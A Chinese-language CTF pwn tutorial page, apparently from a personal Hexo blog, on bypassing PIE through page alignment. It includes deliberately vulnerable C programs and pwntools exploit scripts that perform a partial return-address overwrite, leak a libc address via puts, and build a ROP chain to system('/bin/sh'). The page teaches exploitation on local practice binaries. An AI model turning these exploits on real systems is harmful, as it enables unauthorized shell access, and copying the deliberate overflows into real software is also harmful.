@@ -1,0 +1,659 @@
+<!DOCTYPE html><html lang="[&quot;zh-CN&quot;,&quot;en&quot;,&quot;default&quot;]" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>页对齐机制绕过PIE保护 | 乙太</title><meta name="author" content="乙太"><meta name="copyright" content="乙太"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="页对齐：说明程序内存段的开始和结束地址其末尾都是0x000，在gdb的时候使用vmmap命令可见端倪。 所以程序的末3位是永远不会被影响的。 所以我们可以通过动态调试，先获取后门函数的最后3位，但是构造payload的时候记得多溢出一个字节就可以了。 例题1（pie）： #include &lt;stdio.h&gt; void init(){     setbuf(stdin, 0);">
+<meta property="og:type" content="article">
+<meta property="og:title" content="页对齐机制绕过PIE保护">
+<meta property="og:url" content="https://blog.oisec.cn/%E9%80%86%E5%90%91/PWN/%E9%A1%B5%E5%AF%B9%E9%BD%90%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4/index.html">
+<meta property="og:site_name" content="乙太">
+<meta property="og:description" content="页对齐：说明程序内存段的开始和结束地址其末尾都是0x000，在gdb的时候使用vmmap命令可见端倪。 所以程序的末3位是永远不会被影响的。 所以我们可以通过动态调试，先获取后门函数的最后3位，但是构造payload的时候记得多溢出一个字节就可以了。 例题1（pie）： #include &lt;stdio.h&gt; void init(){     setbuf(stdin, 0);">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.oisec.cn/%E9%80%86%E5%90%91/PWN/%E9%A1%B5%E5%AF%B9%E9%BD%90%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4/wps323.jpg">
+<meta property="article:published_time" content="2026-05-27T16:51:48.000Z">
+<meta property="article:modified_time" content="2026-05-27T17:42:49.205Z">
+<meta property="article:author" content="乙太">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.oisec.cn/%E9%80%86%E5%90%91/PWN/%E9%A1%B5%E5%AF%B9%E9%BD%90%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4/wps323.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "页对齐机制绕过PIE保护",
+  "url": "https://blog.oisec.cn/%E9%80%86%E5%90%91/PWN/%E9%A1%B5%E5%AF%B9%E9%BD%90%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4/",
+  "image": "https://blog.oisec.cn/%E9%80%86%E5%90%91/PWN/%E9%A1%B5%E5%AF%B9%E9%BD%90%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4/wps323.jpg",
+  "datePublished": "2026-05-27T16:51:48.000Z",
+  "dateModified": "2026-05-27T17:42:49.205Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "乙太",
+      "url": "https://blog.oisec.cn"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/toux.jpg"><link rel="canonical" href="https://blog.oisec.cn/%E9%80%86%E5%90%91/PWN/%E9%A1%B5%E5%AF%B9%E9%BD%90%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.json","preload":false,"top_n_per_article":2,"unescape":true,"pagination":{"enable":true,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'medium_zoom',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '页对齐机制绕过PIE保护',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/github-chart.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="乙太" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/toux.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">256</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">97</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">70</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><i class="fa-fw fas fa-rss"></i><span> RSS</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/%E9%80%86%E5%90%91/PWN/%E9%A1%B5%E5%AF%B9%E9%BD%90%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4/wps323.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/toux.jpg" alt="Logo"><span class="site-name">乙太</span></a><a class="nav-page-title" href="/"><span class="site-name">页对齐机制绕过PIE保护</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><i class="fa-fw fas fa-rss"></i><span> RSS</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">页对齐机制绕过PIE保护</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-27T16:51:48.000Z" title="发表于 2026-05-28 00:51:48">2026-05-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-27T17:42:49.205Z" title="更新于 2026-05-28 01:42:49">2026-05-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%80%86%E5%90%91/">逆向</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%80%86%E5%90%91/PWN/">PWN</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>页对齐：说明程序内存段的开始和结束地址其末尾都是0x000，在gdb的时候使用vmmap命令可见端倪。</p>
+<p>所以程序的末3位是永远不会被影响的。</p>
+<p>所以我们可以通过动态调试，先获取后门函数的最后3位，但是构造payload的时候记得多溢出一个字节就可以了。</p>
+<p><strong>例题1（pie）：</strong></p>
+<p>#include &lt;stdio.h&gt;</p>
+<p>void init(){</p>
+<p>    setbuf(stdin, 0);</p>
+<p>    setbuf(stdout, 0);</p>
+<p>    setbuf(stderr, 0);</p>
+<p>}</p>
+<p>void vuln1(){</p>
+<p>    vuln2();</p>
+<p>}</p>
+<p>void vuln2(){</p>
+<p>    char buf[8];</p>
+<p>    puts(“&gt;&gt;”);</p>
+<p>    read(0, buf, 0x100);</p>
+<p>}</p>
+<p>void backdoor(){</p>
+<p>    system(“&#x2F;bin&#x2F;sh”);</p>
+<p>}</p>
+<p>int main(){</p>
+<p>    init();</p>
+<p>    vuln1();</p>
+<p>    return 0;</p>
+<p>}</p>
+<p>&#x2F;&#x2F; gcc pie.c -o pie -fno-stack-protector</p>
+<p>开了PIE保护的在调试的时候一定要记得打打断点用**”b <em>$rebase(0x123a)”</em>*</p>
+<p>首先我们在IDA中查看后门函数的最后最后一个字节，在retn打断点</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E9%A1%B5%E5%AF%B9%E9%BD%90%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4/wps323.jpg" alt="wps323"> </p>
+<p>然后就可以看到程序页对其的基地址+偏移就是函数地址</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E9%A1%B5%E5%AF%B9%E9%BD%90%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4/wps324.jpg" alt="wps324"> </p>
+<p>所以真正随机化的都是前面部分，最后的三位肯定是固定不变的。</p>
+<p>在继续对比我们的默认返回地址和函数地址就会发现，它真正改变的只有最后一个字节</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E9%A1%B5%E5%AF%B9%E9%BD%90%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4/wps325.jpg" alt="wps325"> </p>
+<p>所以我们在溢出的时候只需要多溢出一个字节把它覆盖成43即可。非常巧妙</p>
+<p>from pwn import *</p>
+<p>context(os&#x3D;’linux’,arch&#x3D;’amd64’,log_level&#x3D;’debug’)</p>
+<p>p &#x3D; process(‘.&#x2F;pie’)</p>
+<p>elf &#x3D; ELF(‘.&#x2F;pie’)</p>
+<p>libc &#x3D; ELF(‘&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6’)</p>
+<h1 id="gdb-attach-p-‘b-rebase-0x123a-’"><a href="#gdb-attach-p-‘b-rebase-0x123a-’" class="headerlink" title="gdb.attach(p, ‘b *$rebase(0x123a)’)"></a>gdb.attach(p, ‘b *$rebase(0x123a)’)</h1><p>offset &#x3D; 0x10</p>
+<p>payload &#x3D; offset*b’a’ + p8(0x43)</p>
+<p>p.sendafter(b’&gt;&gt;\n’, payload)</p>
+<h1 id="pause"><a href="#pause" class="headerlink" title="pause()"></a>pause()</h1><p>p.interactive()</p>
+<p><strong>例题2(pie_two)：</strong></p>
+<p>#include &lt;stdio.h&gt;</p>
+<p>void init(){</p>
+<p>    setbuf(stdin, 0);</p>
+<p>    setbuf(stdout, 0);</p>
+<p>    setbuf(stderr, 0);</p>
+<p>}</p>
+<p>void vuln(){</p>
+<p>    char buf[8];</p>
+<p>    puts(“&gt;&gt;”);</p>
+<p>    read(0, buf, 0x100);</p>
+<p>    printf(“is %s\n”, (char *)buf);</p>
+<p>}</p>
+<p>int main(){</p>
+<p>    init();</p>
+<p>    puts(“Hello, Hacker!”);</p>
+<p>    vuln();</p>
+<p>    return 0;</p>
+<p>}</p>
+<p>&#x2F;&#x2F; gcc pie_two.c -o pie_two -fno-stack-protector</p>
+<p>通过观察IDA分析，得知：</p>
+<p>如果是一般的题形，可以直接通过栈溢出漏洞覆盖返回地址来做libc或者shellcode，但是这题开了PIE保护，程序地址还不知道，所以我们只能知道看能否用prtintf函数泄露一些信息，这样才能考虑其他。所以我们可以断点打在call prinf函数上调试一下：</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E9%A1%B5%E5%AF%B9%E9%BD%90%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4/wps326.jpg" alt="wps326"> </p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E9%A1%B5%E5%AF%B9%E9%BD%90%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4/wps327.jpg" alt="wps327"> </p>
+<p>b *$rebase(0x1236)</p>
+<p>必须再次调用vuln函数，可以先看到IDA中显示的vuln函数的开头位置是0x11f5</p>
+<p>在原来的返回地址是正常的程序地址，根据页对其原则算出vuln开头指令的程序地址计算，再对比一下，发现只有最后三位都是不一样的，这让我们构造溢出的时候，很不好收，因为我们知道只能一个字节一个字节也就是两位两位来算</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E9%A1%B5%E5%AF%B9%E9%BD%90%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4/wps328.jpg" alt="wps328"> </p>
+<p>那么这样我们怎么才能绕过PIE，准确覆盖到我们想要的地方去呢？？？</p>
+<p>（虽然爆破那一位也有可能，但是不弄）</p>
+<p>遇到这种情况，可以观察寄存器！！！</p>
+<p>继续单步执行到retn指令，发现RDI寄存器指向的竟然是一个libc地址（\x7f开头经验所得）</p>
+<p>此时正好程序中又puts函数，而RDI又是第一个参数，那么岂不是刚好可以构造返回到puts函数，泄露libc地址，然后vuln函数恰巧也又执行一遍，直接打libc</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E9%A1%B5%E5%AF%B9%E9%BD%90%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4/wps329.jpg" alt="wps329"> </p>
+<p>再而后还可以发现，程序默认返回的是0x1266，而我们要构造的puts在0x1257，发现又只有最后一个字节也就是两位不同了，解决了三位不同的问题。</p>
+<p>所以只需要多溢出一字节p8(0x57)就会跳到puts函数。</p>
+<p>然后就注意计算libc地址的时候，那个函数不一定能在libc文件中用sym找到，就只能自己手动计算，如下：</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E9%A1%B5%E5%AF%B9%E9%BD%90%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4/wps330.jpg" alt="wps330"> </p>
+<h1 id="方法一-断点调试frintf，问题是函数最后三位不一样，不好溢出，可能需要爆破"><a href="#方法一-断点调试frintf，问题是函数最后三位不一样，不好溢出，可能需要爆破" class="headerlink" title="方法一 断点调试frintf，问题是函数最后三位不一样，不好溢出，可能需要爆破"></a>方法一 断点调试frintf，问题是函数最后三位不一样，不好溢出，可能需要爆破</h1><h1 id="但是看寄存器，发现RDI寄存器保存了一个函数地址，可以通过puts函数泄露函数地址"><a href="#但是看寄存器，发现RDI寄存器保存了一个函数地址，可以通过puts函数泄露函数地址" class="headerlink" title="但是看寄存器，发现RDI寄存器保存了一个函数地址，可以通过puts函数泄露函数地址"></a>但是看寄存器，发现RDI寄存器保存了一个函数地址，可以通过puts函数泄露函数地址</h1><h1 id="会发现这样又调用了一次vuln函数"><a href="#会发现这样又调用了一次vuln函数" class="headerlink" title="会发现这样又调用了一次vuln函数"></a>会发现这样又调用了一次vuln函数</h1><h1 id="可以计算出libc-base-然后通过libc文件构造ROP-前提是需要提供libc文件才能正常打linc"><a href="#可以计算出libc-base-然后通过libc文件构造ROP-前提是需要提供libc文件才能正常打linc" class="headerlink" title="可以计算出libc_base 然后通过libc文件构造ROP,前提是需要提供libc文件才能正常打linc"></a>可以计算出libc_base 然后通过libc文件构造ROP,前提是需要提供libc文件才能正常打linc</h1><h1 id="ROPgadget-–binary-x2F-lib-x2F-x86-64-linux-gnu-x2F-libc-so-6-–only-“pop-ret”-grep-“rdi”"><a href="#ROPgadget-–binary-x2F-lib-x2F-x86-64-linux-gnu-x2F-libc-so-6-–only-“pop-ret”-grep-“rdi”" class="headerlink" title="ROPgadget –binary &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 –only “pop|ret” | grep “rdi”"></a>ROPgadget –binary &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 –only “pop|ret” | grep “rdi”</h1><p>from pwn import *</p>
+<p>context(os&#x3D;’linux’,arch&#x3D;’amd64’,log_level&#x3D;’debug’)</p>
+<p>p &#x3D; process(‘.&#x2F;pie_two’)</p>
+<p>elf &#x3D; ELF(‘.&#x2F;pie_two’)</p>
+<p>libc &#x3D; ELF(‘&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6’)</p>
+<h1 id="gdb-attach-p-’b-rebase-0x1236-’"><a href="#gdb-attach-p-’b-rebase-0x1236-’" class="headerlink" title="gdb.attach(p,’b *$rebase(0x1236)’)"></a>gdb.attach(p,’b *$rebase(0x1236)’)</h1><p>payload &#x3D; 0x10*b’a’ + p8(0x57)</p>
+<p>p.sendafter(b’&gt;&gt;\n’,payload)</p>
+<p>funlockfile &#x3D; u64(p.recvuntil(b’\x7f’)[-6:].ljust(8,b’\x00’))</p>
+<p>libc_base &#x3D; funlockfile - libc.sym[‘funlockfile’]#找不到就自己算</p>
+<p>system &#x3D; libc_base + libc.sym[‘system’]</p>
+<p>bin_sh &#x3D; libc_base + next(libc.search(b’&#x2F;bin&#x2F;sh\x00’))</p>
+<h1 id="开始执行第二遍vuln"><a href="#开始执行第二遍vuln" class="headerlink" title="开始执行第二遍vuln"></a>开始执行第二遍vuln</h1><p>rdi &#x3D; libc_base + 0x2a3e5</p>
+<p>ret &#x3D; libc_base + 0x29cd6</p>
+<p>payload &#x3D; 0x10*b’a’ + p64(ret) + p64(rdi) + p64(bin_sh) + p64(system)</p>
+<p>p.sendafter(b’&gt;&gt;\n’,payload)</p>
+<h1 id="pause-1"><a href="#pause-1" class="headerlink" title="pause()"></a>pause()</h1><p>p.interactive()</p>
+<p><strong>方法2：</strong></p>
+<p>还有一方法，直接覆盖成vuln函数，因为call vuln函数的地址和程序默认的返回地址还是只差最后一个字节不同。所以可以通过printf得到的程序地址-减去-IDA看到的指令偏移，就得到程序基址。</p>
+<p>再打libc…</p>
+</article><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/%E9%80%86%E5%90%91/PWN/%E9%A1%B5%E5%AF%B9%E9%BD%90%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87PIE%E4%BF%9D%E6%8A%A4/wps323.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>如果这篇文章帮到了你，可以请我喝杯咖啡。</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/images/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/images/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/images/zhifubao.jpg" target="_blank"><img class="post-qr-code-img" src="/images/zhifubao.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/CTF/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" title="内存取证"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">内存取证</div></div><div class="info-2"><div class="info-item-1">Volatility工具使用详解&amp;&amp;做题-CTF对抗-看雪-安全社区|安全招聘|kanxue.com 高难度CyberDefenders: Blue team CTF Challenges | TeamSpy溯源取证-内存取证 高难度篇_strings -el svchost*-CSDN博客老规矩，先看一下当前映像的系统信息 1./volatility_2.6_lin64_standalone -f c74-TeamSpy/ecorpoffice/win7ecorpoffice2010-36b02ed3.vmem imageinfo   使用两种方式获得进程列表pslist，或者psscan 1./volatility_2.6_lin64_standalone -f c74-TeamSpy/ecorpoffice/win7ecorpoffice2010-36b02ed3.vmem --profile=Win7SP1x64 pslist  1./volatility_2.6_lin64_standalone -f c74-TeamSpy/ecorpoffice/wi...</div></div></div></a><a class="pagination-related" href="/%E9%80%86%E5%90%91/PWN/%E7%BB%95%E8%BF%87canary%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/" title="绕过canary的奇技淫巧"><img class="cover" src="/%E9%80%86%E5%90%91/PWN/%E7%BB%95%E8%BF%87canary%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/wps316.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">绕过canary的奇技淫巧</div></div><div class="info-2"><div class="info-item-1">magic方法ret掉canary判断失败的__stack_chk_failh函数 magic–got修改got表，由于canary再je判断失败的时候会跳转到一个__stack_chk_fail函数，我们直接修改这个函数的got表指向就可以了。 例题(__stack_chk_fail) #include &lt;stdio.h&gt; void init(){     setbuf(stdin, 0);     setbuf(stdout, 0);     setbuf(stderr, 0); } void vuln(){     char buf[8];     puts(“name?”);     read(0, buf, 0x100);     printf(“Hello, %s\n”, buf);     puts(“&gt;&gt;”);     read(0, buf, 0x100); } int main(){     init();     vuln();     return 0; } &#x2F;&#x2F; gcc puts_canary.c -o put...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#gdb-attach-p-%E2%80%98b-rebase-0x123a-%E2%80%99"><span class="toc-number">1.</span> <span class="toc-text">gdb.attach(p, ‘b *$rebase(0x123a)’)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pause"><span class="toc-number">2.</span> <span class="toc-text">pause()</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95frintf%EF%BC%8C%E9%97%AE%E9%A2%98%E6%98%AF%E5%87%BD%E6%95%B0%E6%9C%80%E5%90%8E%E4%B8%89%E4%BD%8D%E4%B8%8D%E4%B8%80%E6%A0%B7%EF%BC%8C%E4%B8%8D%E5%A5%BD%E6%BA%A2%E5%87%BA%EF%BC%8C%E5%8F%AF%E8%83%BD%E9%9C%80%E8%A6%81%E7%88%86%E7%A0%B4"><span class="toc-number">3.</span> <span class="toc-text">方法一 断点调试frintf，问题是函数最后三位不一样，不好溢出，可能需要爆破</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%86%E6%98%AF%E7%9C%8B%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%8C%E5%8F%91%E7%8E%B0RDI%E5%AF%84%E5%AD%98%E5%99%A8%E4%BF%9D%E5%AD%98%E4%BA%86%E4%B8%80%E4%B8%AA%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87puts%E5%87%BD%E6%95%B0%E6%B3%84%E9%9C%B2%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-number">4.</span> <span class="toc-text">但是看寄存器，发现RDI寄存器保存了一个函数地址，可以通过puts函数泄露函数地址</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BC%9A%E5%8F%91%E7%8E%B0%E8%BF%99%E6%A0%B7%E5%8F%88%E8%B0%83%E7%94%A8%E4%BA%86%E4%B8%80%E6%AC%A1vuln%E5%87%BD%E6%95%B0"><span class="toc-number">5.</span> <span class="toc-text">会发现这样又调用了一次vuln函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%AF%E4%BB%A5%E8%AE%A1%E7%AE%97%E5%87%BAlibc-base-%E7%84%B6%E5%90%8E%E9%80%9A%E8%BF%87libc%E6%96%87%E4%BB%B6%E6%9E%84%E9%80%A0ROP-%E5%89%8D%E6%8F%90%E6%98%AF%E9%9C%80%E8%A6%81%E6%8F%90%E4%BE%9Blibc%E6%96%87%E4%BB%B6%E6%89%8D%E8%83%BD%E6%AD%A3%E5%B8%B8%E6%89%93linc"><span class="toc-number">6.</span> <span class="toc-text">可以计算出libc_base 然后通过libc文件构造ROP,前提是需要提供libc文件才能正常打linc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ROPgadget-%E2%80%93binary-x2F-lib-x2F-x86-64-linux-gnu-x2F-libc-so-6-%E2%80%93only-%E2%80%9Cpop-ret%E2%80%9D-grep-%E2%80%9Crdi%E2%80%9D"><span class="toc-number">7.</span> <span class="toc-text">ROPgadget –binary &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 –only “pop|ret” | grep “rdi”</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#gdb-attach-p-%E2%80%99b-rebase-0x1236-%E2%80%99"><span class="toc-number">8.</span> <span class="toc-text">gdb.attach(p,’b *$rebase(0x1236)’)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E6%89%A7%E8%A1%8C%E7%AC%AC%E4%BA%8C%E9%81%8Dvuln"><span class="toc-number">9.</span> <span class="toc-text">开始执行第二遍vuln</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pause-1"><span class="toc-number">10.</span> <span class="toc-text">pause()</span></a></li></ol></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 乙太</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.0.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div 